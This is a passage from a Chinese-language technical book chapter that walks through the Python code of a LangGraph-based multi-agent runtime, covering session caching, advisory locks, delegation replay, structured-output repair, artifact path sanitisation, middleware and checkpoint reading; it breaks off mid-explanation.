**为什么把 `planner_lock` 和 `conversation_deleted` 做成回调而不是直接持有对象**：这样运行时不需要知道 `LangGraphPostgresManager` 和 `ConversationTombstoneStore` 的存在——它只有两个「能问出答案的函数」。这是依赖倒置的具体应用。

**构造时的组装**（`runtime_factory.py`）：

```python
    async def create(
        self,
        user_id: int,
        conversation_id: UUID,
    ) -> ConversationAgentRuntime:
        """装配一个隔离的 Conversation Agent 运行时。"""
        await self.init()
        resources = self._resources
        if resources is None:
            raise RuntimeError("Agent 运行时工厂尚未初始化")

        conversation_backend = await self._sandbox.get_backend(
            user_id,
            conversation_id,
        )
        checkpointer = self._persistence.get_checkpointer()
        orchestration = app_config.cfg.agent.orchestration
        session_store = PostgresSandboxSessionStore(
            user_id=user_id,
            conversation_id=conversation_id,
            persistence=self._persistence,
            checkpointer=checkpointer,
            sandbox=self._sandbox,
            conversation_backend=conversation_backend,
        )
        specialist_factory = SpecialistAgentFactory(
            resources.specialist_definitions,
            resources.specialist_models,
            self._sandbox,
            checkpointer,
        )
        session_service = AgentSessionService(
            build_agent=specialist_factory.create,
            session_store=session_store,
            user_id=user_id,
            conversation_id=conversation_id,
            max_parallel_sessions=orchestration.max_parallel_sessions,
            max_sessions=orchestration.max_sessions,
        )
        shell_jobs = ShellJobRuntime(conversation_backend.shell_jobs)
        planner = self._create_planner(
            resources.planner_model,
            session_service,
            shell_jobs,
            conversation_backend,
            checkpointer,
        )
        return ConversationAgentRuntime(
            planner=planner,
            session_service=session_service,
            shell_jobs=shell_jobs,
            planner_lock=lambda: self._persistence.advisory_lock(
                conversation_lifecycle_lock_name(user_id, conversation_id),
            ),
            conversation_deleted=lambda: self._tombstones.exists(
                user_id,
                conversation_id,
            ),
        )
```

**模型和专业 Agent 定义是共享的**（`_SharedAgentResources`），只有沙箱后端、Session 存储、Planner 图是每个会话独立的：

```python
@dataclass(frozen=True, slots=True)
class _SharedAgentResources:
    """跨 Conversation 复用的模型和专业 Agent 定义。"""

    planner_model: BaseChatModel
    specialist_models: dict[AgentType, BaseChatModel]
    specialist_definitions: dict[AgentType, SpecialistDefinition]
```

**为什么模型要共享**：模型客户端内部有 HTTP 连接池。每个会话建一套客户端，几百个会话就是几百个连接池——资源和内存都会爆。

**初始化用双重检查锁**：

```python
    async def init(self) -> None:
        """初始化所有 Conversation 共享的模型和专业 Agent 能力。"""
        if self._resources is not None:
            return
        async with self._init_lock:
            if self._resources is not None:
                return

            active_model_name = app_config.cfg.lm_config.active
            specialist_model_names: dict[AgentType, str] = {
                agent_type: (
                    active_model_name
                    if app_config.cfg.agent.specialists[agent_type].model == "default"
                    else app_config.cfg.agent.specialists[agent_type].model
                )
                for agent_type in AGENT_TYPES
            }
            configured_names = {active_model_name, *specialist_model_names.values()}
            models = {
                model_name: create_configured_model(model_name)
                for model_name in configured_names
            }
```

**`configured_names` 用集合去重**——如果三个 Specialist 都用 `default`，只会创建一个模型实例。

**MCP 工具在初始化时加载**（因为它是异步的、有网络开销）：

```python
            explorer_mcp_tools = await get_mcp_tools()
```

**运行时缓存的 LRU 淘汰**：

```python
    async def _build_and_cache_conversation_runtime(
        self,
        conversation_key: ConversationKey,
        user_id: int,
        conversation_id: UUID,
    ) -> ConversationAgentRuntime:
        """构建会话级 Agent 运行时并写入缓存。"""
        current_task = asyncio.current_task()
        try:
            runtime = await self._runtime_factory.create(
                user_id,
                conversation_id,
            )
        except (Exception, asyncio.CancelledError):
            async with self._state_lock:
                if self._runtime_build_tasks.get(conversation_key) is current_task:
                    self._runtime_build_tasks.pop(conversation_key, None)
            raise

        evicted_runtimes: list[ConversationAgentRuntime] = []
        async with self._state_lock:
            if self._runtime_build_tasks.get(conversation_key) is current_task:
                self._runtime_build_tasks.pop(conversation_key, None)
                if conversation_key not in self._deleted_conversation_keys:
                    self._conversation_runtimes[conversation_key] = runtime
                    self._conversation_runtimes.move_to_end(conversation_key)
                    while len(self._conversation_runtimes) > self._max_cached_runtimes:
                        evictable_key = next(
                            (
                                key
                                for key in self._conversation_runtimes
                                if key != conversation_key
                                and not self._conversation_run_tasks.get(key)
                            ),
                            None,
                        )
                        if evictable_key is None:
                            break
                        evicted = self._conversation_runtimes.pop(evictable_key)
                        evicted_runtimes.append(evicted)
        for evicted in evicted_runtimes:
            evicted.session_service.clear()
            await evicted.shell_jobs.cleanup()
        return runtime
```

四个关键点：

1. **`_runtime_build_tasks` 做去重**。如果两个请求同时要同一个会话的运行时，只建一个（另一个 `await` 同一个 task）。构建完成后从字典里移除。

2. **构建失败也要清理 `_runtime_build_tasks`**。`except (Exception, asyncio.CancelledError)` 里做——否则失败的构建会永远留在字典里，后续请求都拿到那个失败的任务。

3. **`_deleted_conversation_keys` 检查**。构建期间会话可能被删了。如果已删除，**不放进缓存**（但仍返回给调用方，让它在执行时检查 `conversation_deleted()` 并报错）。

4. **淘汰时跳过正在运行的会话**。`not self._conversation_run_tasks.get(key)` —— 正在跑 Agent 的会话不能被淘汰，否则它的 `shell_jobs` 会被清理，正在跑的 Shell 任务会中断。

**`_max_cached_runtimes = 128`**：缓存最多 128 个会话的运行时。

**取运行时的并发保护**：

```python
    async def get_conversation_runtime(
        self,
        user_id: int,
        conversation_id: UUID,
    ) -> ConversationAgentRuntime:
        """获取会话级 Agent 运行时，不存在时按需创建。"""
        await self.init()
        conversation_key = (user_id, conversation_id)
        if await self._tombstones.exists(user_id, conversation_id):
            async with self._state_lock:
                self._deleted_conversation_keys.add(conversation_key)
            raise RuntimeError("该会话已被删除")
        async with self._state_lock:
            if conversation_key in self._deleted_conversation_keys:
                raise RuntimeError("该会话已被删除")
            if runtime := self._conversation_runtimes.get(conversation_key):
                self._conversation_runtimes.move_to_end(conversation_key)
                return runtime
            build_task = self._runtime_build_tasks.get(conversation_key)
            if build_task is None:
                build_task = asyncio.create_task(
                    self._build_and_cache_conversation_runtime(
                        conversation_key,
                        user_id,
                        conversation_id,
                    )
                )
                self._runtime_build_tasks[conversation_key] = build_task
        return await asyncio.shield(build_task)
```

**`asyncio.shield(build_task)` 很关键**。如果不 shield，请求 A 在等待构建时被取消（客户端断开），会连带取消 `build_task`——但请求 B 可能也在等同一个 task，它就被坑了。`shield` 让取消只影响等待方。

**执行登记**：

```python
    @asynccontextmanager
    async def execution(
        self,
        user_id: int,
        conversation_id: UUID,
        *,
        runtime: ConversationAgentRuntime,
    ) -> AsyncGenerator[PlannerTurnContext, None]:
        """登记完整用户回合并建立共享运行状态。"""
        current_task = asyncio.current_task()
        if current_task is None:
            raise RuntimeError("Agent 执行必须在 asyncio 任务上下文中进行")
        conversation_key = (user_id, conversation_id)
        async with self._state_lock:
            if conversation_key in self._deleted_conversation_keys:
                raise RuntimeError("该会话已被删除")
            self._conversation_run_tasks.setdefault(conversation_key, set()).add(
                current_task
            )
        turn_context = PlannerTurnContext(
            user_id=user_id,
            conversation_id=conversation_id,
            max_continuations=(app_config.cfg.agent.orchestration.max_continuations),
        )
        try:
            async with runtime.planner_lock():
                if await runtime.conversation_deleted():
                    raise RuntimeError("该会话已被删除")
                yield turn_context
        finally:
            async with self._state_lock:
                tasks = self._conversation_run_tasks.get(conversation_key)
                if tasks is not None:
                    tasks.discard(current_task)
                    if not tasks:
                        self._conversation_run_tasks.pop(conversation_key, None)
```

**三层保护**：

1. **登记任务**（`_conversation_run_tasks`）。这样 LRU 淘汰和删除操作知道「这个会话正在跑」。
2. **跨进程 advisory lock**（`runtime.planner_lock()`）。防止 API 进程和 Worker 进程同时跑同一个会话。
3. **锁内再检查一次删除墓碑**。因为从「登记」到「拿到锁」之间可能被删了。

**用 `set` 存任务而不是单个任务**：同一个会话理论上不应该有两个并发回合（`ConversationRunService` 会拦），但用 set 更健壮——清理时能确保所有任务都取消。

### 9.3.7 委派：Session 服务

`AgentSessionService` 是 902 行的核心。它的入口是 `execute_delegation`：

```python
    async def execute_delegation(
        self,
        request: DelegationRequest,
        parent_config: RunnableConfig,
        *,
        delegation_id: str | None = None,
        activity_writer: SubagentActivityWriter | None = None,
    ) -> DelegationResult:
        """创建或恢复一个专业 Agent Session。"""
        delegation_id = DelegationMessageContext(
            delegation_id=delegation_id or uuid4().hex
        ).delegation_id
        activity_started = False
        session_key = self._build_session_key(
            request.analysis_id,
            request.agent_type,
            request.session_id,
        )
        config = self.build_subagent_config(parent_config, session_key)
        try:
            async with (
                self._session_store.lock(session_key),
                self._session_store.reserve_capacity(session_key, self._max_sessions),
                _acquire_nowait(
                    self._parallelism,
                    "当前 Conversation 的并行 Session 已满",
                ),
            ):
```

**三重并发控制，按粒度从细到粗**：

| 控制 | 粒度 | 机制 | 满了会怎样 |
| --- | --- | --- | --- |
| `session_store.lock(session_key)` | 单个 Session | PG advisory lock | 抛 `AdvisoryLockBusyError` |
| `reserve_capacity` | 单会话的 Session 总数 | PG advisory lock 槽位 | 抛 `RuntimeError` |
| `_acquire_nowait(self._parallelism)` | 单会话的并发数 | asyncio.Semaphore | 抛 `RuntimeError` |

**`_acquire_nowait` 是「非阻塞获取」**：

```python
@asynccontextmanager
async def _acquire_nowait(
    guard: asyncio.Lock | asyncio.Semaphore,
    busy_message: str,
) -> AsyncGenerator[None, None]:
    """立即竞争进程内并发许可，已占用时直接失败。"""
    if guard.locked():
        raise RuntimeError(busy_message)
    await guard.acquire()
    try:
        yield
    finally:
        guard.release()
```

**为什么不等而要立刻失败**：Planner 在 QuickJS 里用 `Promise.all` 并行发起多个委派。如果并发满了还排队等待，所有委派会串行化——`Promise.all` 就失去意义了。立即失败让 Planner 知道「现在跑不了这么多」，可以调整策略。

**`if guard.locked()` 有个微小竞态**（检查后可能被别人抢先），但 `await guard.acquire()` 会正确处理，只是不会立刻失败。实际影响很小。

**容量槽位的实现**（`session_store.py`）：

```python
    @asynccontextmanager
    async def reserve_capacity(
        self,
        session_key: AgentSessionKey,
        max_sessions: int,
    ) -> AsyncGenerator[None, None]:
        """为新 Session 获取一个跨进程容量槽位。

        新 Session 在首个 Checkpoint 写入前不会出现在持久化 namespace 列表中。
        槽位持有到本次执行结束，使并发进程也会计入这段空窗口。
        """
        namespaces = set(await self.list_namespaces(None))
        if session_key.checkpoint_ns in namespaces:
            yield
            return
        if len(namespaces) >= max_sessions:
            raise RuntimeError("当前 Conversation 的 Session 数量已达上限")

        for slot in range(len(namespaces), max_sessions):
            try:
                async with self._persistence.advisory_lock(
                    f"specialist-capacity:{self._thread_id}:{slot}"
                ):
                    yield
                    return
            except AdvisoryLockBusyError:
                continue
        raise RuntimeError("当前 Conversation 的 Session 数量已达上限")
```

**注释里指出的问题很微妙**：新建的 Session 在**第一次写 Checkpoint 之前**不会出现在 namespace 列表里。所以「数 namespace 个数」这个判断在并发场景下会漏算——两个进程同时数到 99，都以为还能再建一个。

**解法是用 advisory lock 当「占位符」**：槽位号从 `len(namespaces)` 到 `max_sessions`，逐个尝试拿 `specialist-capacity:{thread}:{slot}` 这把锁。拿到就占了这个槽位，直到本次执行结束。

这样即使 namespace 还没写，槽位已经被锁占了，另一个进程会跳过它。

**重放（replay）机制**：

```python
                replayed_result = await self._get_replayed_delegation_result(
                    request,
                    session_key,
                    delegation_id,
                )
                if replayed_result is not None:
                    self._write_status_activity(
                        request,
                        delegation_id,
                        replayed_result.status,
                        activity_writer,
                    )
                    return replayed_result
```

```python
    async def _get_replayed_delegation_result(
        self,
        request: DelegationRequest,
        session_key: AgentSessionKey,
        delegation_id: str,
    ) -> DelegationResult | None:
        """恢复 Planner 待执行工具时复用同一 delegation 的既有结果。"""
        state_values = await self._read_session_state(session_key)
        result = SpecialistCheckpointView(state_values).replayed_result(
            request,
            delegation_id,
        )
        if result is None:
            return None
```

**这个机制解决一个真实问题**：LangGraph 从 Checkpoint 恢复时，会重新执行「还没写入结果的工具调用」。如果这个 `delegation` 已经执行过（结果在 Specialist 的 Checkpoint 里），重跑一遍会：
- 浪费时间和 token；
- 可能产生副作用（比如生成两份报告文件）。

所以先查 Specialist 的 Checkpoint 里有没有这个 `delegation_id` 的结果，有就直接复用。

**`delegation_id` 用 `runtime.tool_call_id`**：

```python
        delegation_id = runtime.tool_call_id
        if delegation_id is None:
            raise RuntimeError("delegation 工具缺少 tool_call_id")
```

**用 LangChain 生成的 tool_call_id 当委派 ID**，而不是自己生成随机 ID。因为恢复时同一个工具调用的 `tool_call_id` 是**稳定**的（它在 Checkpoint 里）——这正是重放能对上的原因。

### 9.3.8 Specialist 的构造与结构化输出

```python
def create_specialist_agent(
    *,
    name: str,
    system_prompt: str,
    skill_directory: Path,
    model: BaseChatModel,
    tools: Sequence[BaseTool],
    backend: DockerSandboxBackend,
    checkpointer: BaseCheckpointSaver,
    shell_jobs: ShellJobRuntime,
    skills: Sequence[str],
    extra_middleware: Sequence[AgentMiddleware] = (),
) -> CompiledStateGraph:
    """编译共享文件、附件和 Shell 生命周期的专业 Agent。"""
    resolved_backend, filesystem = build_specialist_filesystem(
        backend,
        skill_directory,
        skills,
    )
    return create_deep_agent(
        model=model,
        tools=[
            *tools,
            *create_view_image_tools(model),
            *create_shell_tools(shell_jobs),
        ],
        system_prompt=system_prompt,
        middleware=[
            filesystem,
            UserMessageContextMiddleware(
                resolved_backend,
                backend.conversation_dir,
                shell_jobs,
            ),
            *extra_middleware,
            MessageTimestampMiddleware(),
        ],
        backend=resolved_backend,
        skills=list(skills),
        subagents=[],
        response_format=_specialist_response_format(model),
        state_schema=SpecialistAgentState,
        checkpointer=checkpointer,
        name=name,
    )
```

**结构化输出策略按模型能力选**：

```python
def _specialist_response_format(
    model: BaseChatModel,
) -> ProviderStrategy[SpecialistResult] | ToolStrategy[SpecialistResult]:
    """按模型能力选择 Specialist 结构化输出策略。"""
    if model.profile and model.profile.get("structured_output"):
        # 原生 JSON Schema 能让 Provider 在生成时约束最终跨 Agent 结果。
        return ProviderStrategy(SpecialistResult, strict=True)
    return ToolStrategy(SpecialistResult)
```

| 策略 | 机制 | 优点 | 缺点 |
| --- | --- | --- | --- |
| `ProviderStrategy` | Provider 原生 JSON Schema 约束 | 生成时就被约束，格式一定正确 | 需要模型支持 |
| `ToolStrategy` | 让模型调用一个「结构化输出工具」 | 通用 | 模型可能不调用，或参数不符 |

**配置里说明了为什么默认模型走 ToolStrategy**：

```yaml
      profile: # 模型能力描述和上下文限制。
        image_inputs: false # 当前模型是否支持识别图片内容。
        structured_output: false # DeepSeek Responses 原生 JSON Schema 可能返回空正文，Specialist 使用工具调用输出。
        max_input_tokens: 1048576 # 模型上下文长度，用于计算对话压缩阈值。
```

注释直接写了原因：**DeepSeek 的原生 JSON Schema 可能返回空正文**。所以走 ToolStrategy。

**Specialist 的状态扩展**：

```python
class SpecialistAgentState(DeepAgentState):
    """增加显式 delegation 状态的专业 Agent Checkpoint。"""

    # 结构化响应只属于当前 delegation。若跨运行持久化，Agent 路由会把旧值
    # 误判为本轮已经完成，并将旧结果再次返回。
    structured_response: NotRequired[
        Annotated[SpecialistResult, EphemeralValue, OmitFromInput]
    ]
    delegation_records: Annotated[
        dict[str, object],
        _merge_delegation_records,
    ]
```

**`EphemeralValue` + `OmitFromInput` 是关键**。注释解释了原因：

- `EphemeralValue` 表示这个值**不跨运行持久化**。如果持久化了，下一轮执行时 Agent 的路由逻辑看到 `structured_response` 有值，会认为「本轮已经完成」，直接把旧结果返回——用户第二次委派拿到的是第一次的答案。
- `OmitFromInput` 表示它不出现在输入里。

**`delegation_records` 用自定义 reducer**：

```python
def _merge_delegation_records(
    current: dict[str, object],
    updates: dict[str, object],
) -> dict[str, object]:
    """按 delegation ID 覆盖单条状态，同时保留同 Session 的历史记录。"""
    return {**current, **updates}
```

**浅合并**：按 `delegation_id` 覆盖单条，保留其它记录。这样同一个 Session 多次委派的记录都能查到（`list_sessions` 和前端展示需要）。

**结果校验与一次修正**（`session_service.py` 的 `_invoke_specialist`）：

```python
            result: SpecialistResult | None = None
            repair_error: Exception | None = None
            try:
                parsed_result = parse_specialist_result(output)
            except (TypeError, ValueError, ValidationError) as error:
                plain_response = SpecialistCheckpointView(output).plain_response(
                    delegation_id
                )
                if plain_response is not None:
                    # 部分模型会直接给出完整文本终答而不调用结构化输出工具。
                    # 此时现场回答比重新从长会话历史生成摘要更可靠；保留正文，
                    # 未经结构化声明的产物自然降级为空。
                    result = SpecialistResult(
                        status="completed",
                        content=plain_response,
                    )
                    result = await self._prepare_specialist_result(result, session_key)
                else:
                    repair_error = error
```

**两级容错**：

1. **结构化输出失败但模型给了纯文本终答** → 包成 `completed` 结果，`artifacts` 为空。注释解释了取舍：「现场回答比重新从长会话历史生成摘要更可靠」。
2. **完全解析不出来** → 走一次修正重试：

```python
            if repair_error is not None:
                retry_output = await self._stream_specialist(
                    agent_run.agent,
                    {
                        "messages": [
                            HumanMessage(
                                content=_specialist_repair_message(repair_error),
                                additional_kwargs={
                                    DELEGATION_CONTEXT_KEY: context.model_dump(
                                        mode="json"
                                    ),
                                    _INTERNAL_RETRY_KEY: True,
                                },
                            )
                        ]
                    },
                    config,
                    request,
                    delegation_id,
                    activity_writer,
                    emit_messages=False,
                )
                result = parse_specialist_result(retry_output)
                result = await self._prepare_specialist_result(result, session_key)
```

修正提示词把具体约束讲清楚：

```python
def _specialist_repair_message(error: Exception) -> str:
    """生成一次无工具结果修复所需的具体约束。"""
    category = (
        "结构解析" if isinstance(error, TypeError | ValidationError) else "业务校验"
    )
    return (
        "上一条 SpecialistResult 未通过校验。当前 Session 已有的工具结果和文件保持有效，"
        "请重新输出结构化结果。\n"
        f"失败类别：{category}。\n"
        f"失败约束：{error}\n"
        "completed 必须提供完整 content；needs_repair 必须提供 repair_requests；"
        "failed 必须提供 failure_reasons。"
    )
```

**注意 `emit_messages=False`**——修正过程不产生面向用户的事件。因为用户已经看到第一次的输出，修正只是内部修复。

**只修正一次**。如果第二次还失败，`parse_specialist_result` 会抛错，被 `execute_delegation` 捕获后返回 `failed` 结果。

**产物的路径解析与清洗**：

```python
    async def _prepare_specialist_result(
        self,
        result: SpecialistResult,
        session_key: AgentSessionKey,
    ) -> SpecialistResult:
        """规范化即将跨 Agent 传递的结构化结果并过滤无效产物。"""
        # 相对路径只在产出它的 Session 内有明确含义；跨过此边界后统一传递绝对路径。
        result = self._resolve_result_artifacts(result, session_key)
        await self._validate_repair_targets(result, session_key)
        return await self._sanitize_result_artifacts(result, session_key)
```

三步：

1. **相对路径转绝对路径**。注释说明了原因：相对路径只在产出它的 Session 内有意义，跨 Session 传递时必须转成绝对路径。比如 analyst 要读 explorer 的产物，`_v1.parquet` 在 explorer 的目录里才有意义。
2. **校验修补目标**（前面讲过的 `_validate_repair_targets`）。
3. **清洗产物引用**：

```python
    async def _sanitize_result_artifacts(
        self,
        result: SpecialistResult,
        session_key: AgentSessionKey,
    ) -> SpecialistResult:
        """过滤越界或不存在的产物，同时保留正文结论和有效产物。"""
        session_prefix = f"{_session_workspace(session_key)}/"
        artifact_paths = {artifact.path for artifact in result.artifacts}
        out_of_scope = {
            path for path in artifact_paths if not path.startswith(session_prefix)
        }
        in_scope = artifact_paths - out_of_scope
        missing = (
            set(await self._session_store.find_missing_files(in_scope))
            if in_scope
            else set()
        )
        invalid_paths = out_of_scope | missing
        artifacts = [
            artifact
            for artifact in result.artifacts
            if artifact.path not in invalid_paths
        ]
        artifact_warnings = [
            *(f"忽略越界产物：{path}" for path in sorted(out_of_scope)),
            *(f"忽略不存在的产物：{path}" for path in sorted(missing)),
        ]
        warnings = list(dict.fromkeys([*result.warnings, *artifact_warnings]))[:100]
        return result.model_copy(
            update={
                "artifacts": artifacts,
                "warnings": warnings,
            }
        )
```

**两类无效产物**：

| 类型 | 检查 | 危害 |
| --- | --- | --- |
| 越界 | 路径不以本 Session 工作目录开头 | 模型声称产出了别的会话的文件（可能是幻觉，也可能是越权尝试） |
| 不存在 | 容器里 stat 不到 | 模型声称产出了文件但实际没写 |

**注意它不清洗正文，只清洗 `artifacts`**。正文结论保留，只是把无效的产物引用去掉并记进 `warnings`。这样「模型给了有用的结论但产物路径写错了」不会导致整个结果作废。

**批量检查文件是否存在**：

```python
    async def find_missing_files(self, paths: Collection[str]) -> set[str]:
        """批量返回当前 Conversation 工作区中不存在的文件。"""
        if not paths:
            return set()
        arguments = " ".join(shlex.quote(path) for path in sorted(paths))
        command = (
            f"set -- {arguments}; "
            'for path do [ -f "$path" ] || printf \'%s\\0\' "$path"; done'
        )
        result = await self._conversation_backend.aexecute(
            command,
            timeout=10,
        )
        if result.exit_code != 0 or result.truncated:
            raise RuntimeError("批量验证产物文件失败")
        return {path for path in result.output.split("\0") if path}
```

**用一条 shell 命令批量检查**，而不是逐个 stat。因为每个 stat 都是一次 `docker exec`，几十个产物就是几十次往返。

**用 NUL 分隔输出**（`printf '%s\0'`），因为文件路径可能含空格和换行。用 NUL 分隔是唯一安全的方式。

**`shlex.quote` 防注入**——路径来自模型。

### 9.3.9 中间件

**`MessageTimestampMiddleware`（43 行，最简单的中间件）**：

```python
def _stamp_response(response: ModelResponse[Any]) -> ModelResponse[Any]:
    """为模型响应中的消息补充统一创建时间。"""
    for message in response.result:
        message.additional_kwargs.setdefault(
            MESSAGE_CREATED_AT_KEY,
            datetime.now(UTC).isoformat(),
        )
    return response


class MessageTimestampMiddleware(AgentMiddleware[Any, Any, Any]):
    """在模型响应进入 LangGraph 状态前写入创建时间。"""

    def wrap_model_call(
        self,
        request: ModelRequest[Any],
        handler: Callable[[ModelRequest[Any]], ModelResponse[Any]],
    ) -> ModelResponse[Any]:
        """为同步模型响应写入创建时间。"""
        return _stamp_response(handler(request))

    async def awrap_model_call(
        self,
        request: ModelRequest[Any],
        handler: Callable[[ModelRequest[Any]], Awaitable[ModelResponse[Any]]],
    ) -> ModelResponse[Any]:
        """为异步模型响应写入创建时间。"""
        return _stamp_response(await handler(request))
```

**用 `setdefault` 而不是直接赋值**——如果消息已经有时间戳（比如从 Checkpoint 恢复的），不覆盖。

**为什么需要这个中间件**：消息创建时间不在模型的响应里。前端要显示每条消息的时间，但 LangGraph 的 Checkpoint 时间戳是整个状态的，不是单条消息的。所以在这里补。

**`SemanticRecallExpansionMiddleware`（召回引用展开）**：

```python
class SemanticRecallExpansionMiddleware(AgentMiddleware[Any, Any, Any]):
    """仅在当前模型请求中展开已授权的召回记录。"""

    def wrap_model_call(
        self,
        request: ModelRequest[Any],
        handler: Callable[[ModelRequest[Any]], ModelResponse[Any]],
    ) -> ModelResponse[Any]:
        """拒绝需要异步数据读取的同步模型调用。"""
        if _current_turn_references(request.messages):
            raise RuntimeError("语义召回展开需要异步执行")
        return handler(request)

    async def awrap_model_call(
        self,
        request: ModelRequest[Any],
        handler: Callable[[ModelRequest[Any]], Awaitable[ModelResponse[Any]]],
    ) -> ModelResponse[Any]:
        """在异步模型调用前展开当前回合的语义召回引用。"""
        references = _current_turn_references(request.messages)
        if not references:
            return await handler(request)

        messages = list(request.messages)
        try:
            user_id, conversation_id = resolve_semantic_recall_identity(get_config())
            records, missing_queries = await _load_recall_records(
                user_id,
                conversation_id,
                references,
            )
        except Exception:  # noqa: BLE001
            logger.exception("语义召回展开失败")
            expanded_error = json.dumps(
                {
                    "status": "error",
                    "message": "语义召回记录暂不可用",
                },
                ensure_ascii=False,
            )
            for index, _ in references:
                message = messages[index]
                messages[index] = message.model_copy(update={"content": expanded_error})
            return await handler(request.override(messages=messages))

        messages = _replace_reference_content(
            messages,
            references,
            records,
            missing_queries,
        )
        return await handler(request.override(messages=messages))
```

**同步版本直接抛错**。因为展开需要读数据库（异步）。如果框架走同步路径，明确报错而不是静默返回未展开的内容。

**只展开「当前回合」的引用**：

```python
def _current_turn_references(
    messages: list[Any],
) -> list[tuple[int, SemanticRecallReference]]:
    """提取当前用户回合产生的语义召回引用。"""
    last_human_index = -1
    for index, message in enumerate(messages):
        if isinstance(message, HumanMessage) and not message.additional_kwargs.get(
            "dataagent_internal_retry"
        ):
            last_human_index = index
    return [
        (index, reference)
        for index, message in enumerate(messages)
        if index > last_human_index
        and isinstance(message, ToolMessage)
        and (reference := parse_semantic_recall_reference(message)) is not None
    ]
```

**`index > last_human_index` 只取最后一个真实用户消息之后的引用**。为什么：

- 历史回合的召回引用已经展开过、模型也已经用过它们得出结论了。重复展开会让上下文膨胀。
- **排除内部重试消息**（`dataagent_internal_retry`）——修正重试不是一个新回合，不应该重置边界。

**展开失败时降级**：把引用替换成一段错误说明，而不是让整个模型调用失败。**这是对的**——召回记录读不到不应该让对话中断，模型可以基于已有信息继续，或者自己重新召回。

**`EvalDelegationMiddleware`**：

```python
class EvalDelegationMiddleware(AgentMiddleware[Any, Any, Any]):
    """把 QuickJS PTC 委派清单附加到父 eval 的 ToolMessage。"""

    def __init__(self, session_service: AgentSessionService) -> None:
        """绑定当前 Conversation 的专业 Session 服务。"""
        self._session_service = session_service

    async def awrap_tool_call(
        self,
        request: ToolCallRequest,
        handler: Callable[
            [ToolCallRequest],
            Awaitable[ToolMessage | Command[Any]],
        ],
    ) -> ToolMessage | Command[Any]:
        """执行 eval，并将其内部委派记录写入可持久化消息元数据。"""
        if request.tool_call.get("name") != "eval":
            return await handler(request)

        tool_call_id = str(request.tool_call.get("id") or "")
        try:
            result = await handler(request)
        except BaseException:
            self._session_service.take_eval_delegations(tool_call_id)
            raise

        records = self._session_service.take_eval_delegations(tool_call_id)
        if not records or not isinstance(result, ToolMessage):
            return result
        additional_kwargs = {
            **result.additional_kwargs,
            EVAL_DELEGATIONS_KEY: [
                record.model_dump(mode="json") for record in records
            ],
        }
        return result.model_copy(update={"additional_kwargs": additional_kwargs})
```

**它只拦 `eval` 工具**，其余直接透传。

**为什么需要它**：Planner 在 QuickJS 里调 `delegation` 时，`delegation` 工具是通过 PTC 被调用的，它的 ToolMessage 不会出现在 Planner 的主消息流里。所以前端看不到「在 eval 里发起了哪些委派」。

**做法**：`delegation` 工具在执行时把记录登记到 `session_service._eval_delegations`（按父 `eval` 的 `tool_call_id` 索引），这个中间件在 `eval` 完成后把记录**附加到 eval 的 ToolMessage 的 `additional_kwargs` 里**。这样消息投影时能读出来（`langchain_message_to_schema` 里的 `EVAL_DELEGATIONS_KEY` 分支）。

**异常路径也要清理**（`except BaseException: take_eval_delegations(...)`），否则失败的 eval 会留下垃圾记录。

**`UserMessageContextMiddleware`（515 行，最复杂的中间件）**：

它负责把用户消息的**私有上下文**投影到模型请求里。核心数据结构：

```python
class UserMessageContext(StrictProtocolModel):
    """LangChain content 无法承载的用户消息私有上下文。"""

    received_at: datetime
    attachments: list[UserMessageAttachment] = Field(default_factory=list)

    @field_validator("received_at", mode="before")
    @classmethod
    def parse_received_at(cls, value: object) -> object:
        """解析 Checkpoint 中保存的 ISO 8601 时间。"""
        if not isinstance(value, str):
            return value
        try:
            return datetime.fromisoformat(value)
        except ValueError:
            return value

    @field_validator("received_at")
    @classmethod
    def normalize_received_at(cls, value: datetime) -> datetime:
        """要求时区信息并统一为 UTC。"""
        if value.tzinfo is None or value.utcoffset() is None:
            raise ValueError("received_at 必须包含时区")
        return value.astimezone(UTC)
```

**`received_at` 强制要求时区**。因为服务器和用户可能在不同时区，无时区的时间会产生歧义。

**附件路径只存规范化后的相对路径**：

```python
class UserMessageAttachment(StrictProtocolModel):
    """一项用户消息附件引用。"""

    f_path: NonEmptyText

    @field_validator("f_path")
    @classmethod
    def validate_relative_path(cls, value: str) -> str:
        """只持久化规范的 Conversation 内相对路径。"""
        return normalize_attachment_path(value)
```

**为什么用「私有上下文 + 请求期投影」而不是直接放进消息 content**：

- 消息 content 会进 Checkpoint，会进模型上下文，会影响 prompt cache。
- `received_at` 和附件列表是**元信息**，只在特定时机需要（比如模型要读附件内容时）。
- 存在 `additional_kwargs` 里，**请求时投影成 content block**（`project_user_message_context`），**消息投影时只取需要的部分**（`read_user_message_context`）。

这是「存最小的，用时展开」的模式，和 9.3.9 的召回引用展开是同一个思路。

### 9.3.10 Checkpoint 只读投影

`CheckpointStateReader` 是一个**不依赖 CompiledGraph 的只读读取器**：

```python
class CheckpointStateReader:
    """不依赖 CompiledGraph 运行资源读取最新 Assistant 状态。"""

    def __init__(self, checkpointer: BaseCheckpointSaver) -> None:
        """绑定 LangGraph Checkpoint 持久化实现。"""
        self._checkpointer = checkpointer

    async def read(self, config: RunnableConfig) -> CheckpointState:
        """读取最新 Checkpoint，并合并已经提交的节点 pending writes。"""
        saved = await self._checkpointer.aget_tuple(config)
        if saved is None:
            return CheckpointState(values={}, next_nodes=(), updated_at=None)
```

**为什么不用 `CompiledGraph.aget_state()`**：那个方法需要图的运行资源（会创建运行时对象），开销大。而读消息列表、读子 Agent 活动这些操作只需要状态值，用不上图。**用一个轻量读取器避免「只是看消息却要建一个运行时」**。

**它要处理三个复杂情况**：

**情况一：`messages` 通道是 DeltaChannel**。

```python
        channel_versions = checkpoint.get("channel_versions")
        if isinstance(channel_versions, Mapping) and "messages" in channel_versions:
            history = await self._checkpointer.aget_delta_channel_history(
                config=saved.config,
                channels=["messages"],
            )
            message_history = history["messages"]
            message_channel = DeltaChannel(
                cast(Any, _messages_delta_reducer),
                list,
                snapshot_frequency=50,
            )
            message_channel.key = "messages"
            message_channel = message_channel.from_checkpoint(
                values.get("messages", message_history.get("seed"))
            )
            message_channel.replay_writes(message_history["writes"])
            values["messages"] = message_channel.get() or []
```

**LangGraph 1.x 引入了 DeltaChannel**：消息不再每步全量存快照，而是存「种子 + 增量写入」（`snapshot_frequency=50` 表示每 50 次写一个全量快照）。要拿到完整消息列表，必须重放增量。

这里用 `deepagents` 的 `_messages_delta_reducer` 作为 reducer——**必须和实际图用的 reducer 一致**，否则重放结果不对。

**情况二：pending writes**。

```python
        # 节点结果可能已经写入 pending_writes、尚未来得及形成下一份 Checkpoint；
